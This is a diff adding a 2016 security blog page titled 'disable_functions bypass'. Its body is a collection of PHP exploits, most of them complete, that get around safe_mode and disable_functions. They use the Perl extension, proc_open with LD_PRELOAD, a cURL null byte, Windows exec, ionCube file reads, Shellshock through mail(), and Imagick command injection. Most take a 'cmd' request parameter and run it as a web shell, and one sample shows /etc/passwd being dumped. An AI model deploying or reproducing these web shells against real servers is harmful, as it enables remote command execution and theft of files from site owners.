@@ -1,0 +1,604 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="bypass," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="PHP 5.2 - FOpen Exploit1php -r &amp;apos;fopen(&amp;quot;srpath://../../../../../../../dir/pliczek&amp;quot;, &amp;quot;a&amp;quot;);&amp;apos;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="disable_functions bypass">
+<meta property="og:url" content="http://yoursite.com/2016/05/06/disable-functions-bypass/index.html">
+<meta property="og:site_name" content="xl7dev">
+<meta property="og:description" content="PHP 5.2 - FOpen Exploit1php -r &amp;apos;fopen(&amp;quot;srpath://../../../../../../../dir/pliczek&amp;quot;, &amp;quot;a&amp;quot;);&amp;apos;">
+<meta property="og:updated_time" content="2016-06-22T17:59:30.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="disable_functions bypass">
+<meta name="twitter:description" content="PHP 5.2 - FOpen Exploit1php -r &amp;apos;fopen(&amp;quot;srpath://../../../../../../../dir/pliczek&amp;quot;, &amp;quot;a&amp;quot;);&amp;apos;">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2016/05/06/disable-functions-bypass/"/>
+
+  <title> disable_functions bypass | xl7dev </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">xl7dev</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">blog</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                disable_functions bypass
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-05-06T15:29:50+08:00" content="2016-05-06">
+              2016-05-06
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="PHP-5-2-FOpen-Exploit"><a href="#PHP-5-2-FOpen-Exploit" class="headerlink" title="PHP 5.2 - FOpen Exploit"></a>PHP 5.2 - FOpen Exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;fopen(&quot;srpath://../../../../../../../dir/pliczek&quot;, &quot;a&quot;);&apos;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h3 id="PHP-Perl-Extension-Safe-mode-Bypass-Exploit"><a href="#PHP-Perl-Extension-Safe-mode-Bypass-Exploit" class="headerlink" title="PHP Perl Extension Safe_mode Bypass Exploit"></a>PHP Perl Extension Safe_mode Bypass Exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">##########################################################</span><br><span class="line">###----------------------------------------------------###</span><br><span class="line">###----PHP Perl Extension Safe_mode Bypass Exploit-----###</span><br><span class="line">###----------------------------------------------------###</span><br><span class="line">###-Author:--NetJackal---------------------------------###</span><br><span class="line">###-Email:---nima_501[at]yahoo[dot]com-----------------###</span><br><span class="line">###-Website:-http://netjackal.by.ru--------------------###</span><br><span class="line">###----------------------------------------------------###</span><br><span class="line">##########################################################</span><br><span class="line"> </span><br><span class="line">if(!extension_loaded(&apos;perl&apos;))die(&apos;perl extension is not loaded&apos;);</span><br><span class="line">if(!isset($_GET))$_GET=&amp;$HTTP_GET_VARS;</span><br><span class="line">if(empty($_GET[&apos;cmd&apos;]))$_GET[&apos;cmd&apos;]=(strtoupper(substr(PHP_OS,0,3))==&apos;WIN&apos;)?&apos;dir&apos;:&apos;ls&apos;;</span><br><span class="line">$perl=new perl();</span><br><span class="line">echo &quot;&lt;textarea rows=&apos;25&apos; cols=&apos;75&apos;&gt;&quot;;</span><br><span class="line">$perl-&gt;eval(&quot;system(&apos;&quot;.$_GET[&apos;cmd&apos;].&quot;&apos;)&quot;);</span><br><span class="line">echo &quot;&amp;lt;/textarea&amp;gt;&quot;;</span><br><span class="line">$_GET[&apos;cmd&apos;]=htmlspecialchars($_GET[&apos;cmd&apos;]);</span><br><span class="line">echo &quot;&lt;br&gt;&lt;form&gt;CMD: &lt;input type=text name=cmd value=&apos;&quot;.$_GET[&apos;cmd&apos;].&quot;&apos; size=25&gt;&lt;/form&gt;&quot;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="PHP-safe-mode-bypass-via-proc-open-and-custom-environment-Exploit"><a href="#PHP-safe-mode-bypass-via-proc-open-and-custom-environment-Exploit" class="headerlink" title="PHP safe_mode bypass via proc_open() and custom environment Exploit"></a>PHP safe_mode bypass via proc_open() and custom environment Exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--p $path=&quot;/var/www&quot;; //change to your writable path $a=fopen($path.&quot;/.comm&quot;,&quot;w&quot;); fputs($a,$_GET[&quot;c&quot;]); fclose($a); $descriptorspec = array(  0--&gt; array(&quot;pipe&quot;, &quot;r&quot;),</span><br><span class="line"> 1 =&amp;gt; array(&quot;file&quot;, $path.&quot;/output.txt&quot;,&quot;w&quot;),</span><br><span class="line"> 2 =&amp;gt; array(&quot;file&quot;, $path.&quot;/errors.txt&quot;, &quot;a&quot; )</span><br><span class="line">); $cwd = &apos;.&apos;; $env = array(&apos;LD_PRELOAD&apos; =&amp;gt; $path.&quot;/a.so&quot;); $process = proc_open(&apos;id &amp;gt; /tmp/a&apos;, $descriptorspec, $pipes, $cwd, $env); // example command - should not succeed sleep(1); $a=fopen($path.&quot;/.comm1&quot;,&quot;r&quot;);</span><br><span class="line">echo &quot;&lt;strong&gt;&quot;;</span><br><span class="line">while (!feof($a))</span><br><span class="line">&#123;$b=fgets($a);echo $b;&#125; fclose($a);</span><br><span class="line">?&amp;gt;;</span><br><span class="line">&lt;/strong&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="PHP-5-2-4-and-5-2-5-PHP-cURL"><a href="#PHP-5-2-4-and-5-2-5-PHP-cURL" class="headerlink" title="PHP 5.2.4 and 5.2.5 PHP cURL"></a>PHP 5.2.4 and 5.2.5 PHP cURL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">source: http://www.securityfocus.com/bid/27413/info</span><br><span class="line"> </span><br><span class="line">PHP cURL is prone to a &apos;safe mode&apos; security-bypass vulnerability.</span><br><span class="line"> </span><br><span class="line">Attackers can use this issue to gain access to restricted files, potentially obtaining sensitive information that may aid in further attacks.</span><br><span class="line"> </span><br><span class="line">The issue affects PHP 5.2.5 and 5.2.4. </span><br><span class="line"> </span><br><span class="line">var_dump(curl_exec(curl_init(&quot;file://safe_mode_bypass\x00&amp;quot;.__FILE__)));</span><br></pre></td></tr></table></figure>
+<h3 id="PHP-lt-5-2-9-on-windows"><a href="#PHP-lt-5-2-9-on-windows" class="headerlink" title="PHP &lt;= 5.2.9 on windows"></a>PHP &lt;= 5.2.9 on windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//cmd.php</span><br><span class="line">/*</span><br><span class="line">	Abysssec Inc Public Advisory </span><br><span class="line">	</span><br><span class="line">	Here is another safemod bypass vulnerability exist in php &lt;= 5.2.9 on windows .</span><br><span class="line">	the problem comes from OS behavior - implement  and interfacing between php</span><br><span class="line">	and operation systems directory structure . the problem is php won&apos;t tell difference </span><br><span class="line">	between directory browsing in linux and windows this can lead attacker to ability </span><br><span class="line">	execute his / her commands on targert machie even in SafeMod On  (php.ini setting) . </span><br><span class="line">	=============================================================================</span><br><span class="line">	in linux when you want open a directory for example php directory you need</span><br><span class="line">	to go to /usr/bin/php and you can&apos;t use \usr\bin\php . but windows won&apos;t tell</span><br><span class="line">	diffence between slash and back slash it means there is no didffrence  between </span><br><span class="line">	c:\php and c:/php , and this is not vulnerability but itself but  because of this  simple </span><br><span class="line">	php implement &quot;\&quot; character can escape safemode using  function like excec . </span><br><span class="line">	here is a PoC for discussed vulnerability . just upload files on your target host and execute</span><br><span class="line">	your commands . </span><br><span class="line">	==============================================================================</span><br><span class="line">	note : this vulnerabities is just for educational purpose and author will be not be responsible  </span><br><span class="line">	for any damage using this vulnerabilty. </span><br><span class="line">	==============================================================================</span><br><span class="line">	for more information visit Abysssec.com</span><br><span class="line">	feel free to contact me at admin [at] abysssec.com</span><br><span class="line">*/</span><br><span class="line">	$cmd = $_REQUEST[&apos;cmd&apos;];</span><br><span class="line">	if ($cmd)&#123;</span><br><span class="line">	$batch = fopen (&quot;cmd.bat&quot;,&quot;w&quot;);</span><br><span class="line">	fwrite($batch,&quot;$cmd&gt;abysssec.txt&quot;.&quot;\r\n&quot;);</span><br><span class="line">	fwrite($batch,&quot;exit&quot;);</span><br><span class="line">	fclose($batch);</span><br><span class="line">	exec(&quot;\start cmd.bat&quot;);</span><br><span class="line">	echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;h1&gt;Abysssec.com PHP &lt;= 5.2.9 SafeMod Bypasser&lt;/h1&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;textarea rows=20 cols=60&gt;&quot;;</span><br><span class="line">	require(&quot;abysssec.txt&quot;);</span><br><span class="line">	echo &quot;&lt;/textarea&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;/center&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body bgcolor=#000000 and text=#DO0000&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;form method=post&gt;</span><br><span class="line">&lt;input type=text name=cmd &gt;</span><br><span class="line">&lt;input type=submit value=bypass&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>cmd.bat<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir &gt; abyss.txt</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></p>
+<h3 id="PHP-5-2-4-ionCube-extension-Exploit"><a href="#PHP-5-2-4-ionCube-extension-Exploit" class="headerlink" title="PHP 5.2.4 ionCube extension Exploit"></a>PHP 5.2.4 ionCube extension Exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//PHP 5.2.4 ionCube extension safe_mode and disable_functions protections bypass</span><br><span class="line"> </span><br><span class="line">//author: shinnai</span><br><span class="line">//mail: shinnai[at]autistici[dot]org</span><br><span class="line">//site: http://shinnai.altervista.org</span><br><span class="line"> </span><br><span class="line">//Tested on xp Pro sp2 full patched, worked both from the cli and on apache</span><br><span class="line"> </span><br><span class="line">//Technical details:</span><br><span class="line">//ionCube version: 6.5</span><br><span class="line">//extension: ioncube_loader_win_5.2.dll (other may also be vulnerable)</span><br><span class="line">//url: www.ioncube.com</span><br><span class="line"> </span><br><span class="line">//php.ini settings:</span><br><span class="line">//safe_mode = On</span><br><span class="line">//disable_functions = ioncube_read_file, readfile</span><br><span class="line"> </span><br><span class="line">//Description:</span><br><span class="line">//This is useful to obtain juicy informations but also to retrieve source</span><br><span class="line">//code of php pages, password files, etc... you just need to change file path.</span><br><span class="line">//Anyway, don&apos;t worry, nobody will read your obfuscated code :)</span><br><span class="line"> </span><br><span class="line">//greetz to: BlackLight for help me to understand better PHP</span><br><span class="line"> </span><br><span class="line">//P.S.</span><br><span class="line">//This extension contains even an interesting ioncube_write_file function...</span><br><span class="line">if (!extension_loaded(&quot;ionCube Loader&quot;)) die(&quot;ionCube Loader extension required!&quot;);</span><br><span class="line">$path = str_repeat(&quot;..\\&quot;, 20);</span><br><span class="line">$MyBoot_readfile = readfile($path.&quot;windows\\system.ini&quot;); #just to be sure that I set correctely disable_function :)</span><br><span class="line">$MyBoot_ioncube = ioncube_read_file($path.&quot;boot.ini&quot;);</span><br><span class="line">echo $MyBoot_readfile;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;ionCube output:&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo $MyBoot_ioncube;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="PHP-5-x-Shellshock-Exploit"><a href="#PHP-5-x-Shellshock-Exploit" class="headerlink" title="PHP 5.x Shellshock Exploit"></a>PHP 5.x Shellshock Exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &quot;Disabled functions: &quot;.ini_get(&apos;disable_functions&apos;).&quot;\n&quot;;</span><br><span class="line">function shellshock($cmd) &#123; // Execute a command via CVE-2014-6271 @ mail.c:283</span><br><span class="line">   if(strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;</span><br><span class="line">     $tmp = tempnam(&quot;.&quot;,&quot;data&quot;);</span><br><span class="line">     putenv(&quot;PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class="line">     // In Safe Mode, the user may only alter environment variables whose names</span><br><span class="line">     // begin with the prefixes supplied by this directive.</span><br><span class="line">     // By default, users will only be able to set environment variables that</span><br><span class="line">     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,</span><br><span class="line">     // PHP will let the user modify ANY environment variable!</span><br><span class="line">     mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&apos;t actually send any mail</span><br><span class="line">   &#125;</span><br><span class="line">   else return &quot;Not vuln (not bash)&quot;;</span><br><span class="line">   $output = @file_get_contents($tmp);</span><br><span class="line">   @unlink($tmp);</span><br><span class="line">   if($output != &quot;&quot;) return $output;</span><br><span class="line">   else return &quot;No output, or not vuln.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo shellshock($_REQUEST[&quot;cmd&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Imagick-lt-3-3-0-PHP-gt-5-4-Exploit"><a href="#Imagick-lt-3-3-0-PHP-gt-5-4-Exploit" class="headerlink" title="Imagick  &lt;= 3.3.0 PHP &gt;= 5.4 Exploit"></a>Imagick  &lt;= 3.3.0 PHP &gt;= 5.4 Exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: PHP Imagick disable_functions Bypass</span><br><span class="line"># Date: 2016-05-04</span><br><span class="line"># Exploit Author: RicterZ (ricter@chaitin.com)</span><br><span class="line"># Vendor Homepage: https://pecl.php.net/package/imagick</span><br><span class="line"># Version: Imagick  &lt;= 3.3.0 PHP &gt;= 5.4</span><br><span class="line"># Test on: Ubuntu 12.04</span><br><span class="line"># Exploit:</span><br><span class="line">&lt;?php</span><br><span class="line"># PHP Imagick disable_functions Bypass</span><br><span class="line"># Author: Ricter &lt;ricter@chaitin.com&gt;</span><br><span class="line">#</span><br><span class="line"># $ curl &quot;127.0.0.1:8080/exploit.php?cmd=cat%20/etc/passwd&quot;</span><br><span class="line"># &lt;pre&gt;</span><br><span class="line"># Disable functions: exec,passthru,shell_exec,system,popen</span><br><span class="line"># Run command: cat /etc/passwd</span><br><span class="line"># ====================</span><br><span class="line"># root:x:0:0:root:/root:/usr/local/bin/fish</span><br><span class="line"># daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line"># bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line"># sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line"># sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line"># games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line"># ...</span><br><span class="line"># &lt;/pre&gt;</span><br><span class="line">echo &quot;Disable functions: &quot; . ini_get(&quot;disable_functions&quot;) . &quot;\n&quot;;</span><br><span class="line">$command = isset($_GET[&apos;cmd&apos;]) ? $_GET[&apos;cmd&apos;] : &apos;id&apos;;</span><br><span class="line">echo &quot;Run command: $command\n====================\n&quot;;</span><br><span class="line"> </span><br><span class="line">$data_file = tempnam(&apos;/tmp&apos;, &apos;img&apos;);</span><br><span class="line">$imagick_file = tempnam(&apos;/tmp&apos;, &apos;img&apos;);</span><br><span class="line"> </span><br><span class="line">$exploit = &lt;&lt;&lt;EOF</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://127.0.0.1/image.jpg&quot;|$command&gt;$data_file&quot;)&apos;</span><br><span class="line">pop graphic-context</span><br><span class="line">EOF;</span><br><span class="line"> </span><br><span class="line">file_put_contents(&quot;$imagick_file&quot;, $exploit);</span><br><span class="line">$thumb = new Imagick();</span><br><span class="line">$thumb-&gt;readImage(&quot;$imagick_file&quot;);</span><br><span class="line">$thumb-&gt;writeImage(tempnam(&apos;/tmp&apos;, &apos;img&apos;));</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line"> </span><br><span class="line">echo file_get_contents($data_file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/bypass/" rel="tag">#bypass</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/04/26/Build-XSS-Platform/" rel="next" title="Build XSS Platform">
+                <i class="fa fa-chevron-left"></i> Build XSS Platform
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/05/12/CVE-2016-1897-8-FFMpeg漏洞应急分析/" rel="prev" title="CVE-2016-1897/8 - FFMpeg漏洞应急分析">
+                CVE-2016-1897/8 - FFMpeg漏洞应急分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="xl7dev" />
+          <p class="site-author-name" itemprop="name">xl7dev</p>
+          <p class="site-description motion-element" itemprop="description">Information Security</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">43</span>
+              <span class="site-state-item-name">Artikel</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">36</span>
+                <span class="site-state-item-name">Tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://blog.knownsec.com" target="_blank" title="Knownsec">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Knownsec
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://javaweb.org" target="_blank" title="园长">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  园长
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://jeary.org" target="_blank" title="jeary">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  jeary
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.thinkings.org" target="_blank" title="Tr3jer">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Tr3jer
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-5-2-FOpen-Exploit"><span class="nav-number">1.</span> <span class="nav-text">PHP 5.2 - FOpen Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-Perl-Extension-Safe-mode-Bypass-Exploit"><span class="nav-number">2.</span> <span class="nav-text">PHP Perl Extension Safe_mode Bypass Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-safe-mode-bypass-via-proc-open-and-custom-environment-Exploit"><span class="nav-number">3.</span> <span class="nav-text">PHP safe_mode bypass via proc_open() and custom environment Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-5-2-4-and-5-2-5-PHP-cURL"><span class="nav-number">4.</span> <span class="nav-text">PHP 5.2.4 and 5.2.5 PHP cURL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-lt-5-2-9-on-windows"><span class="nav-number">5.</span> <span class="nav-text">PHP <= 5.2.9 on windows</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-5-2-4-ionCube-extension-Exploit"><span class="nav-number">6.</span> <span class="nav-text">PHP 5.2.4 ionCube extension Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 